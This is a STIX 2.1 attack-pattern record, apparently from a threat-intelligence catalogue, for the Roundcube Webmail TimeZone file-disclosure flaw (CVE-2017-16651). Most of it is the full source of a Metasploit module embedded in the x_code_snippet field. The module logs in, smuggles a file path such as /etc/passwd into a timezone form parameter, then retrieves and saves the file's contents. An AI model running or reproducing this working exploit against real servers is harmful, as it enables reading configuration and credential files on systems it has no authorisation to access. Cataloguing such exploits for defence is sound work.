{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a3bd166a-6cce-496f-b817-3b530682df37",
    "created": "2024-08-14T16:32:29.395667Z",
    "modified": "2024-08-14T16:32:29.395671Z",
    "name": "Roundcube TimeZone Authenticated File Disclosure",
    "description": " Roundcube Webmail allows unauthorized access to arbitrary files on the host's filesystem, including configuration files. This affects all versions from 1.1.0 through version 1.3.2. The attacker must be able to authenticate at the target system with a valid username/password as the attack requires an active session.  Tested against version 1.3.2  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/roundcube_auth_file_read.rb",
            "external_id": "roundcube_auth_file_read.rb"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/thomascube/3ace32074e23fca0e6510e500bd914a1"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-16651"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Roundcube TimeZone Authenticated File Disclosure',\n        'Description' => %q{\n          Roundcube Webmail allows unauthorized access to arbitrary files on the host's filesystem, including configuration files.\n          This affects all versions from 1.1.0 through version 1.3.2. The attacker must be able to authenticate at the target system\n          with a valid username/password as the attack requires an active session.\n\n          Tested against version 1.3.2\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'joel @ ndepthsecurity', # msf module\n          'stonepresto', # EDB Module POC\n          'thomascube' # original PoC, analysis\n        ],\n        'References' => [\n          [ 'EDB', '49510' ],\n          [ 'URL', 'https://gist.github.com/thomascube/3ace32074e23fca0e6510e500bd914a1'],\n          [ 'CVE', '2017-16651']\n        ],\n\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2017-11-09',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('USERNAME', [ true, 'Email User to login with', '']),\n        OptString.new('PASSWORD', [ true, 'Password to login with', '']),\n        OptString.new('TARGETURI', [ true, 'The URI of the Roundcube Application', '/']),\n        OptString.new('FILE', [ true, 'The file to read', '/etc/passwd'])\n      ]\n    )\n  end\n\n  def run\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'GET',\n      'keep_cookies' => true,\n      'vars_get' => {\n        '_task' => 'login'\n      }\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected Response Code (response code: #{res.code})\") unless res.code == 200\n\n    unless res.body =~ /name=\"_token\" value=\"([^\"]+)\"/\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to find Token Value\")\n    end\n\n    vprint_good(\"Token Value: #{Regexp.last_match(1)}\")\n\n    vprint_status('Attempting login')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'vars_post' => {\n        '_token' => Regexp.last_match(1),\n        '_task' => 'login',\n        '_action' => 'login',\n        '_timezone[files][1][path]' => datastore['FILE'],\n        '_url' => '_task=login',\n        '_user' => datastore['USERNAME'],\n        '_pass' => datastore['PASSWORD']\n      },\n      'vars_get' => {\n        '_task' => 'login'\n      }\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid credentials (response code: #{res.code})\") unless res.code == 302\n\n    vprint_status('Attempting exploit')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'GET',\n      'vars_get' => {\n        '_task' => 'settings',\n        '_action' => 'upload-display',\n        '_from' => 'timezone',\n        '_file' => 'rcmfile1'\n      }\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected Response Code (response code: #{res.code})\") unless res.code == 200\n    print_good(res.body)\n\n    store_loot('Roundcube.file', 'text/plain', rhost, res.body, datastore['FILE'])\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-11-09"
}